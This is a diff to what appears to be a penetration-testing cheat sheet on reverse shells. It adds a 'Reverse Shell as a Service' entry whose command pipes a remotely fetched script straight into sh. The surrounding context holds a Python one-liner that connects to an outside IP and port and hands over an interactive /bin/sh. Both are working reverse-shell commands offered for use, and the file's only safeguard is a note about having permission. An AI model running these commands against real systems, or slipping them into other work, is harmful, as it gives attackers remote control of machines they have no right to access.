@@ -14,6 +14,14 @@ Always ensure you have **explicit** permission to access any computer system **b
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+### Reverse Shell as a Service - [https://shell.now.sh](https://shell.now.sh)
+
+[https://github.com/lukechilds/reverse-shell](https://github.com/lukechilds/reverse-shell)  
+
+```bash
+curl https://shell.now.sh/<ip>:<port> | sh
+```
+
 ## Upgrading remote shells
 
 ```bash
